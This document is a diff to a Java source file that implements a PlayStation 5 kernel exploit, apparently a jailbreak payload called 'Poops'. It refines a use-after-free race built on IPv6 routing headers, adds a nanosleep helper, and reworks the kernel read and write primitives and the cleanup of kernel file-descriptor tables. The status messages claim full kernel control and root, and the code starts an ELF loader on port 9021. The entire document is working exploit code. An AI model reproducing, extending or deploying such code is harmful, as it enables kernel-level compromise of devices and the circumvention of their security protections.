@@ -31,9 +31,11 @@ public class Poops {
     private static final int UCRED_SIZE = 360; 
     private static final long RTHDR_TAG = 0x13370000L;
     private static final int MSG_IOV_NUM = 23;
+    
     private static final int TRIPLEFREE_ATTEMPTS = 8;
-    private static final int MAX_ROUNDS_TWIN = 10;
-    private static final int MAX_ROUNDS_TRIPLET = 500;
+    private static final int MAX_ROUNDS_TWIN = 15000;
+    private static final int MAX_ROUNDS_TRIPLET = 50000;
+
     private static final int KQ_FDP = 0xA8;
     private static final int FILEDESC_OFILES = 0x00;
     private static final int FDESCENTTBL_HDR = 0x08;
@@ -109,6 +111,17 @@ public class Poops {
     
     // --- SHARED KERNEL VARIABLES ---
     public static long dataBase = 0;
+
+    // --- SLEEP BUFFER ---
+    private static Buffer ksleep_ts;
+    
+    // --- NATIVE KERNEL SLEEP ---
+    public static void ksleep(long millis) {
+        if (ksleep_ts == null) ksleep_ts = new Buffer(16);
+        ksleep_ts.putLong(0, millis / 1000L);
+        ksleep_ts.putLong(8, (millis % 1000L) * 1000000L);
+        api.call(sys_nanosleep, ksleep_ts.address(), 0L);
+    }
 
     // --- 4. LIBRARY RESOLUTION ---
     public static boolean resolveSyscalls() {
@@ -319,21 +332,21 @@ public class Poops {
     public static void pinThread() {
         Buffer cpuMask = new Buffer(16);
         cpuMask.putShort(0, (short)0x10);
-        api.call(sys_cpuset_setaffinity, 3, 1, -1L, 16, cpuMask.address());
+        api.call(sys_cpuset_setaffinity, 3L, 1L, -1L, 16L, cpuMask.address());
         Buffer rtParams = new Buffer(4);
         rtParams.putShort(0, (short)2);
         rtParams.putShort(2, (short)256);
-        api.call(sys_rtprio_thread, 1, 0, rtParams.address());
+        api.call(sys_rtprio_thread, 1L, 0L, rtParams.address());
     }
 
     public static void unpinThread() {
         Buffer cpuMask = new Buffer(16);
         cpuMask.fill((byte)0xFF); 
-        api.call(sys_cpuset_setaffinity, 3, 1, -1L, 16, cpuMask.address());
+        api.call(sys_cpuset_setaffinity, 3L, 1L, -1L, 16L, cpuMask.address());
         Buffer rtParams = new Buffer(4);
         rtParams.putShort(0, (short)3);
         rtParams.putShort(2, (short)0);
-        api.call(sys_rtprio_thread, 1, 0, rtParams.address());
+        api.call(sys_rtprio_thread, 1L, 0L, rtParams.address());
     }
 
     public static class WorkerState {
@@ -382,7 +395,6 @@ public class Poops {
                 notifyAll();
             }
         }
-        
     }
 
     public static class IovThread extends Thread {
@@ -395,7 +407,7 @@ public class Poops {
                 while (running) {
                     state.waitForWork();
                     if (!running) break;
-                    api.call(sys_recvmsg, iov_sock_a, recvmsg_hdr.address(), 0);
+                    api.call(sys_recvmsg, iov_sock_a, recvmsg_hdr.address(), 0L);
                     state.signalFinished();
                 }
             } catch (Exception e) {}
@@ -414,9 +426,9 @@ public class Poops {
                     int command = state.waitForWork();
                     if (!running) break;
                     if (command == COMMAND_UIO_READ) {
-                        api.call(sys_writev, uio_sock_b, uio_iov_read.address(), 20); 
+                        api.call(sys_writev, uio_sock_b, uio_iov_read.address(), 20L); 
                     } else if (command == COMMAND_UIO_WRITE) {
-                        api.call(sys_readv, uio_sock_a, uio_iov_write.address(), 20); 
+                        api.call(sys_readv, uio_sock_a, uio_iov_write.address(), 20L); 
                     }
                     state.signalFinished();
                 }
@@ -464,7 +476,7 @@ public class Poops {
         freeRthdr(ipv6_sockets[twins[1]]);
         api.call(sys_sched_yield);
         api.call(sys_sched_yield);
-        try { Thread.sleep(1); } catch (Exception e) {}
+        ksleep(1);
 
         boolean reclaimed = false;
         
@@ -571,10 +583,10 @@ public class Poops {
         Status.println("[+] proc_filedesc = 0x".concat(Long.toHexString(proc_filedesc)));
 
         for (int i = 0; i < 3; i++) {
-            triplets[1] = findTriplet(triplets[0], triplets[2], 50000, leakRthdr, buildRthdr(leakRthdr, UCRED_SIZE), tagBuf, tagLen);
+            triplets[1] = findTriplet(triplets[0], triplets[2], MAX_ROUNDS_TRIPLET, leakRthdr, buildRthdr(leakRthdr, UCRED_SIZE), tagBuf, tagLen);
             if (triplets[1] != -1) break;
             api.call(sys_sched_yield);
-            try { Thread.sleep(10); } catch (Exception e) {}
+            ksleep(10);
         }
         
         if (triplets[1] == -1) {
@@ -718,6 +730,11 @@ public class Poops {
         for (int i = 0; i < 4; i++) {
             api.call(sys_read, uio_sock_a, kread_result_bufs[i].address(), size);
             if (kread_result_bufs[i].getLong(0) != 0x4141414141414141L) {
+                triplets[1] = findTriplet(triplets[0], -1, MAX_ROUNDS_TRIPLET, rthdr_readback, buildRthdr(rthdr_readback, UCRED_SIZE), dummy_byte, len_out);
+                if (triplets[1] == -1) {
+                    Status.println("[!] kreadSlow triplet failure 1");
+                    return null;
+                }
                 result = kread_result_bufs[i];
             }
         }
@@ -725,20 +742,14 @@ public class Poops {
         uioState.waitForFinished();
         api.call(sys_write, iov_sock_b, scratch_big.address(), 8);
         
-        for (int attempt = 0; attempt < 3; attempt++) {
-            triplets[1] = findTriplet(triplets[0], -1, 5000, rthdr_readback, buildRthdr(rthdr_readback, UCRED_SIZE), dummy_byte, len_out);
-            if (triplets[1] != -1) break;
-            api.call(sys_sched_yield);
+        triplets[2] = findTriplet(triplets[0], triplets[1], MAX_ROUNDS_TRIPLET, rthdr_readback, buildRthdr(rthdr_readback, UCRED_SIZE), dummy_byte, len_out);
+        if (triplets[2] == -1) {
+            Status.println("[!] kreadSlow triplet failure 2");
+            return null;
         }
-        
+
         iovState.waitForFinished();
         api.call(sys_read, iov_sock_a, dummy_byte.address(), 8);
-        
-        for (int attempt = 0; attempt < 3; attempt++) {
-            triplets[2] = findTriplet(triplets[0], triplets[1], 5000, rthdr_readback, buildRthdr(rthdr_readback, UCRED_SIZE), dummy_byte, len_out);
-            if (triplets[2] != -1) break;
-            api.call(sys_sched_yield);
-        }
 
         if (result == null) return kread_result_bufs[0];
         return result;
@@ -754,11 +765,11 @@ public class Poops {
                 }
             }
             api.call(sys_sched_yield);
-            triplets[1] = findTriplet(triplets[0], -1, 5000, leakRthdr, rthdrSize, tagBuf, tagLen);
+            triplets[1] = findTriplet(triplets[0], -1, MAX_ROUNDS_TRIPLET, leakRthdr, rthdrSize, tagBuf, tagLen);
             if (triplets[1] != -1) {
-                triplets[2] = findTriplet(triplets[0], triplets[1], 5000, leakRthdr, rthdrSize, tagBuf, tagLen);
+                triplets[2] = findTriplet(triplets[0], triplets[1], MAX_ROUNDS_TRIPLET, leakRthdr, rthdrSize, tagBuf, tagLen);
             }
-            try { Thread.sleep(5); } catch (Exception e) {}
+            ksleep(5);
         }
         return 0;
     }
@@ -823,29 +834,30 @@ public class Poops {
         }
 
         for (int i = 0; i < 4; i++) api.call(sys_write, uio_sock_b, data.address(), dataSize);
-
+        
+        triplets[1] = findTriplet(triplets[0], -1, MAX_ROUNDS_TRIPLET, rthdr_readback, buildRthdr(rthdr_readback, UCRED_SIZE), dummy_byte, len_out);
+        if (triplets[1] == -1) {
+            Status.println("[!] kwriteSlow triplet failure 1");
+            return false;
+        }
+        
         uioState.waitForFinished();
         api.call(sys_write, iov_sock_b, scratch_big.address(), 8);
         
-        for (int attempt = 0; attempt < 3; attempt++) {
-            triplets[1] = findTriplet(triplets[0], -1, 5000, rthdr_readback, buildRthdr(rthdr_readback, UCRED_SIZE), dummy_byte, len_out);
-            if (triplets[1] != -1) break;
-            api.call(sys_sched_yield);
+        triplets[2] = findTriplet(triplets[0], triplets[1], MAX_ROUNDS_TRIPLET, rthdr_readback, buildRthdr(rthdr_readback, UCRED_SIZE), dummy_byte, len_out);
+        if (triplets[2] == -1) {
+            Status.println("[!] kwriteSlow triplet failure 2");
+            return false;
         }
-        
+
         iovState.waitForFinished();
         api.call(sys_read, iov_sock_a, dummy_byte.address(), 8);
-
-        for (int attempt = 0; attempt < 3; attempt++) {
-            triplets[2] = findTriplet(triplets[0], triplets[1], 5000, rthdr_readback, buildRthdr(rthdr_readback, UCRED_SIZE), dummy_byte, len_out);
-            if (triplets[2] != -1) break;
-            api.call(sys_sched_yield);
-        }
+        
         return true;
     }
 
     // =================================================================
-    // --- SHARED UTILITIES (Moved to root to prevent duplicates) ---
+    // --- SHARED UTILITIES ---
     // =================================================================
     public static long findDataBase(long proc) {
         long p = proc;
@@ -1066,7 +1078,7 @@ public class Poops {
             ioctlSub.putInt(4, 1);
             ioctlSub.putLong(8, ioctlDesc.address());
             api.call(sys_ioctl, gpuFd, 0xC0108102L, ioctlSub.address());
-            api.call(sys_nanosleep, ioctlTs.address(), 0);
+            ksleep(1);
             return true;
         }
 
@@ -1232,7 +1244,7 @@ public class Poops {
                         long retAlias = api.call(sys_jitshm_alias, eh, 3L, fdBuf.address());
                         int wh = fdBuf.getInt(0);
                         
-                        long mmapRes = api.call(sys_mmap, SHADOW_MAPPING_ADDR, aligned, 3L, 0x11, wh, 0);
+                        long mmapRes = api.call(sys_mmap, SHADOW_MAPPING_ADDR, aligned, 3L, 0x11L, (long)wh, 0L);
                         restoreSysent(s1);
                         
                         if (retCreate != 0 || retAlias != 0 || eh <= 0 || wh <= 0 || mmapRes < 0) {
@@ -1244,7 +1256,7 @@ public class Poops {
                         if (p_memsz > p_filesz) api.memset(SHADOW_MAPPING_ADDR + p_filesz, 0, (int)(p_memsz - p_filesz));
                         
                         long[] s2 = swapSysent(sysentOff, curproc, targetProc);
-                        long mmapRes2 = api.call(sys_mmap, MAPPING_ADDR + p_vaddr, aligned, 5L, 0x11, eh, 0); // PROT_RX
+                        long mmapRes2 = api.call(sys_mmap, MAPPING_ADDR + p_vaddr, aligned, 5L, 0x11L, (long)eh, 0L); // PROT_RX
                         restoreSysent(s2);
 
                         if (mmapRes2 < 0) {
@@ -1253,7 +1265,7 @@ public class Poops {
                         }
 
                     } else {
-                        long mmapRes3 = api.call(sys_mmap, MAPPING_ADDR + p_vaddr, aligned, 3L, 0x1012, 0xFFFFFFFFL, 0);
+                        long mmapRes3 = api.call(sys_mmap, MAPPING_ADDR + p_vaddr, aligned, 3L, 0x1012L, 0xFFFFFFFFL, 0L);
                         if (mmapRes3 < 0) {
                             Status.println("[!] FATAL: Error mapping data mmap3=".concat(String.valueOf(mmapRes3)));
                             return 0;
@@ -1321,9 +1333,9 @@ public class Poops {
             if (ms < 0 || vs < 0) return null;
 
             Buffer mbuf = new Buffer(20); mbuf.fill((byte)0);
-            api.call(sys_setsockopt, ms, IPPROTO_IPV6, 46, mbuf.address(), 20); // PKTINFO
+            api.call(sys_setsockopt, ms, IPPROTO_IPV6, 46, mbuf.address(), 20L); // PKTINFO
             Buffer vbuf = new Buffer(20); vbuf.fill((byte)0);
-            api.call(sys_setsockopt, vs, IPPROTO_IPV6, 46, vbuf.address(), 20);
+            api.call(sys_setsockopt, vs, IPPROTO_IPV6, 46, vbuf.address(), 20L);
 
             long mfp = 0;
             long vfp = 0;
@@ -1393,7 +1405,7 @@ public class Poops {
             api.call(api.dlsym(libkernel, "scePthreadAttrSetstacksize"), at.address(), 0x80000L);
             long scePthreadAttrSetdetachstate = api.dlsym(libkernel, "scePthreadAttrSetdetachstate");
             if (scePthreadAttrSetdetachstate != 0) {
-                api.call(scePthreadAttrSetdetachstate, at.address(), 1); 
+                api.call(scePthreadAttrSetdetachstate, at.address(), 1L); 
             }
             threadName = new Buffer(8); threadName.put(0, "elfldr\0".getBytes());
 
@@ -1411,7 +1423,7 @@ public class Poops {
             api.call(api.dlsym(libkernel, "scePthreadAttrDestroy"), at.address());
             if (ret == 0) {
                 Status.println("[+] Thread spawned. Waiting for bootstrap to complete...");
-                try { Thread.sleep(4000); } catch (Exception e) {}
+                ksleep(4000);
                 Status.println("[+] ELF Loader ready! Port 9021 Open.");
             } else {
                 Status.println("[!] scePthreadCreate failed: ".concat(String.valueOf(ret)));
@@ -1419,7 +1431,7 @@ public class Poops {
         }
     }
 
-    // --- FAST KERNEL PRIMITIVES (Used AFTER Stage 3) ---
+    // --- FAST KERNEL PRIMITIVES ---
     private static Buffer pipeCmdBuf = new Buffer(24);
     
     public static void setVictimPipe(int cnt, int inp, int out, int size, long bufAddr) {
@@ -1428,18 +1440,18 @@ public class Poops {
         pipeCmdBuf.putInt(8, out);
         pipeCmdBuf.putInt(12, size);
         pipeCmdBuf.putLong(16, bufAddr);
-        api.call(sys_write, masterWfd, pipeCmdBuf.address(), 24);
-        api.call(sys_read, masterRfd, pipeCmdBuf.address(), 24);
+        api.call(sys_write, masterWfd, pipeCmdBuf.address(), 24L);
+        api.call(sys_read, masterRfd, pipeCmdBuf.address(), 24L);
     }
 
     public static void kread(long kaddr, Buffer dest, int size) {
         setVictimPipe(size, 0, 0, 0x4000, kaddr);
-        api.call(sys_read, victimRfd, dest.address(), size);
+        api.call(sys_read, victimRfd, dest.address(), (long)size);
     }
 
     public static void kwrite(long kaddr, Buffer src, int size) {
         setVictimPipe(0, 0, 0, 0x4000, kaddr);
-        api.call(sys_write, victimWfd, src.address(), size);
+        api.call(sys_write, victimWfd, src.address(), (long)size);
     }
 
     // --- FAST R/W WRAPPERS ---
@@ -1466,76 +1478,72 @@ public class Poops {
     // ==========================================
     // STAGE 3b: CLEANUP (Kernel Panic Prevention)
     // ==========================================
+
+    private static void removeRthrFromSocket(int fd, long fdOfiles) {
+        long fp = kread64(fdOfiles + fd * FILEDESCENT_SIZE);
+        if (fp == 0 || (fp >>> 48) != 0xFFFF) return;
+        
+        long fData = kread64(fp + 0x00);
+        if (fData == 0 || (fData >>> 48) != 0xFFFF) return;
+        
+        long soPcb = kread64(fData + 0x18);
+        if (soPcb == 0 || (soPcb >>> 48) != 0xFFFF) return;
+        
+        long pktopts = kread64(soPcb + 0x120);
+        if (pktopts != 0 && (pktopts >>> 48) == 0xFFFF) {
+            kwrite64(pktopts + 0x70, 0); 
+        }
+    }
+
     public static void cleanupExploit(long fdOfiles) {
-        int[] fds = {masterRfd, masterWfd, victimRfd, victimWfd};
-        for (int i = 0; i < fds.length; i++) {
-            int fd = fds[i];
+        Status.println("[*] Executing deep kernel cleanup...");
+        
+        for (int i = 0; i < ipv6_count; i++) {
+            removeRthrFromSocket(ipv6_sockets[i], fdOfiles);
+        }
+
+        int[] criticalFds = {masterRfd, masterWfd, victimRfd, victimWfd};
+        for (int fd : criticalFds) {
             long fp = kread64(fdOfiles + fd * FILEDESCENT_SIZE);
             if (fp != 0 && (fp >>> 48) == 0xFFFF) {
-                int rc = kread32(fp + 0x28); 
+                int rc = kread32(fp + 0x28);
                 if (rc > 0 && rc < 0x10000) {
                     kwrite32(fp + 0x28, rc + 0x100);
                 }
             }
         }
 
-        for (int i = 0; i < ipv6_count; i++) {
-            long fp = kread64(fdOfiles + ipv6_sockets[i] * FILEDESCENT_SIZE);
-            if (fp != 0 && (fp >>> 48) == 0xFFFF) {
-                long fData = kread64(fp);
-                if (fData != 0 && (fData >>> 48) == 0xFFFF) {
-                    long soPcb = kread64(fData + 0x18);
-                    if (soPcb != 0 && (soPcb >>> 48) == 0xFFFF) {
-                        long pktopts = kread64(soPcb + INPCB_PKTOPTS);
-                        if (pktopts != 0 && (pktopts >>> 48) == 0xFFFF) {
-                            kwrite64(pktopts + IP6PO_RTHDR, 0); 
-                        }
-                    }
-                }
-            }
-        }
-
         if (uafSocket >= 0) {
             long uafFp = kread64(fdOfiles + uafSocket * FILEDESCENT_SIZE);
-            if (uafFp != 0 && (uafFp >>> 48) == 0xFFFF) {
-                int rc = kread32(uafFp + 0x28);
-                if (rc > 0 && rc < 0x10000) kwrite32(uafFp + 0x28, rc + 0x100);
-                
-                for (int fd = 0; fd <= 255; fd++) {
-                    long fp = kread64(fdOfiles + fd * FILEDESCENT_SIZE);
-                    if (fp == uafFp) kwrite64(fdOfiles + fd * FILEDESCENT_SIZE, 0);
-                }
-            }
-        }
-        
-        Status.println("[+] Kernel Cleanup completed. App is safe to close.");
-    }
-
-    public static void removeUafFile(long fdOfiles) {
-        if (uafSocket >= 0) {
             kwrite64(fdOfiles + uafSocket * FILEDESCENT_SIZE, 0);
-            Status.println("[+] UAF Socket unlinked from kernel table.");
-        }
-    }
 
-    public static void cleanupForJarLoader(long fdOfiles) {
-        int[] fds = {masterRfd, masterWfd, victimRfd, victimWfd, uio_sock_a, uio_sock_b, iov_sock_a, iov_sock_b};
-        for (int i = 0; i < fds.length; i++) {
-            int fd = fds[i];
-            if (fd >= 0) {
-                long fp = kread64(fdOfiles + fd * FILEDESCENT_SIZE);
-                if (fp != 0) {
-                    kwrite32(fp + 0x28, 0x20); 
+            int removed = 0;
+            for (int i = 0; i < 4096; i++) {
+                int tempSock = (int) api.call(sys_socket, 1, 1, 0); 
+                long tempFp = kread64(fdOfiles + tempSock * FILEDESCENT_SIZE);
+                
+                if (tempFp == uafFp && tempFp != 0) {
+                    kwrite64(fdOfiles + tempSock * FILEDESCENT_SIZE, 0);
+                    removed++;
+                }
+                api.call(sys_close, tempSock);
+                if (removed == 3) { 
+                    break;
                 }
             }
+            if (removed > 0) Status.println(" |-> Purged ".concat(String.valueOf(removed)).concat(" phantom files from kernel freelist."));
         }
-        if (GPU.gpuFd >= 0) {
-            api.call(sys_close, GPU.gpuFd);
-            GPU.gpuFd = -1;
-        }
-        Status.println("[+] Kernel resources stabilized.");
-    }
 
+        for (int i = 0; i < ipv6_count; i++) {
+            api.call(sys_close, ipv6_sockets[i]);
+        }
+        api.call(sys_close, uio_sock_a);
+        api.call(sys_close, uio_sock_b);
+        api.call(sys_close, iov_sock_a);
+        api.call(sys_close, iov_sock_b);
+
+        Status.println("[+] Kernel is now stable.");
+    }
 
     public static String getRealFirmware() {
         if (sys_sysctlbyname == 0) return null;
@@ -1548,7 +1556,7 @@ public class Poops {
             Buffer sizeBuf = new Buffer(8);
             sizeBuf.putLong(0, 8);
             
-            long ret = api.call(sys_sysctlbyname, nameBuf.address(), outBuf.address(), sizeBuf.address(), 0, 0);
+            long ret = api.call(sys_sysctlbyname, nameBuf.address(), outBuf.address(), sizeBuf.address(), 0L, 0L);
             
             if (ret == 0) {
                 int minor = outBuf.getByte(2) & 0xFF; 
@@ -1637,7 +1645,7 @@ public class Poops {
     public static void main(String[] args) {
 
         Status.println("=========================================");
-        Status.println("[*] POOPS PS5 PAYLOAD STARTED");
+        Status.println("[*] POOPS PS5 v1.1 PAYLOAD STARTED");
         Status.println("=========================================");
 
         long sysentOff = 0xa00;
@@ -1685,7 +1693,7 @@ public class Poops {
             victimRfd = victimPipes[0]; victimWfd = victimPipes[1];
 
             for (int i = 0; i < 64; i++) {
-                int fd = (int) api.call(sys_socket, AF_INET6, SOCK_STREAM, 0);
+                int fd = (int) api.call(sys_socket, AF_INET6, SOCK_STREAM, 0L);
                 if (fd < 0) break;
                 ipv6_sockets[i] = fd;
                 ipv6_count = i + 1;
@@ -1693,9 +1701,9 @@ public class Poops {
             Status.println("[+] IPv6 Sockets created: ".concat(String.valueOf(ipv6_count)));
 
             for (int i = 0; i < ipv6_count; i++) {
-                api.call(sys_setsockopt, ipv6_sockets[i], IPPROTO_IPV6, 51, 0, 0);
+                api.call(sys_setsockopt, ipv6_sockets[i], IPPROTO_IPV6, 51L, 0L, 0L);
             }
-            try { Thread.sleep(500); } catch (Exception e) {}
+            ksleep(500);
 
             Buffer leakRthdr = new Buffer(UCRED_SIZE);
             for (int i = 0; i < UCRED_SIZE / 8; i++) {
@@ -1715,7 +1723,7 @@ public class Poops {
                     Status.println("[+] SUCCESS! Triplets found.");
                     break;
                 }
-                try { Thread.sleep(10); } catch (Exception e) {}
+                ksleep(10);
             }
 
             if (!raceSuccess) {
@@ -1750,7 +1758,7 @@ public class Poops {
 
             fdOfiles = fdescenttbl + FDESCENTTBL_HDR;
             Status.println("[+] fdOfiles leak: 0x".concat(Long.toHexString(fdOfiles)));
-            try { Thread.sleep(200); } catch (Exception e) {}
+            ksleep(200);
 
             for (int r = 0; r < 6; r++) {
                 if (masterFp == 0) masterFp = kslow64(fdOfiles + (masterRfd * FILEDESCENT_SIZE), leakRthdr, tagBuf, tagLen);
@@ -1762,7 +1770,7 @@ public class Poops {
                 if (masterPipeData != 0 && victimPipeData != 0) break; 
                 
                 Status.println(" |-> Incomplete pointers, retrying...");
-                try { Thread.sleep(200); } catch (Exception e) {}
+                ksleep(200);
             }
 
             if (masterPipeData == 0 || (masterPipeData >>> 48) != 0xFFFF || victimPipeData == 0 || (victimPipeData >>> 48) != 0xFFFF) {
@@ -1799,10 +1807,11 @@ public class Poops {
                 Status.println(" |-> ERROR kwriteSlow, fixing memory (Attempt ".concat(String.valueOf(attempt + 1)).concat("/10)..."));
                 api.call(sys_sched_yield);
                 
-                triplets[1] = findTriplet(triplets[0], -1, 5000, leakRthdr, rthdrSize, tagBuf, tagLen);
+                triplets[1] = findTriplet(triplets[0], -1, MAX_ROUNDS_TRIPLET, leakRthdr, rthdrSize, tagBuf, tagLen);
                 if (triplets[1] != -1) {
-                    triplets[2] = findTriplet(triplets[0], triplets[1], 5000, leakRthdr, rthdrSize, tagBuf, tagLen);
+                    triplets[2] = findTriplet(triplets[0], triplets[1], MAX_ROUNDS_TRIPLET, leakRthdr, rthdrSize, tagBuf, tagLen);
                 }
+                ksleep(20);
             }
 
             if (!corruptOk) {
@@ -1826,9 +1835,6 @@ public class Poops {
                 }
                 return;
             }
-
-            removeUafFile(fdOfiles);
-            cleanupExploit(fdOfiles);
 
             Status.println("=========================================");
             Status.println("[+] FULL KERNEL CONTROL ACHIEVED!");
@@ -1913,6 +1919,9 @@ public class Poops {
                 Status.println("=========================================");
                 Status.println("[+] JAILBREAK SUCCESSFULLY COMPLETED! You are ROOT.");
                 Status.println("=========================================");
+
+                cleanupExploit(fdOfiles);
+
             } else {
                 Status.println("[!] Failed to apply Jailbreak. UID: ".concat(String.valueOf(verifyUid)));
             }
@@ -1972,6 +1981,7 @@ public class Poops {
 
             synchronized(iovState) { iovState.notifyAll(); }
             synchronized(uioState) { uioState.notifyAll(); }
+
 
         } catch (Exception e) {
             Status.printStackTrace("[!] Fatal error in exploit", e);
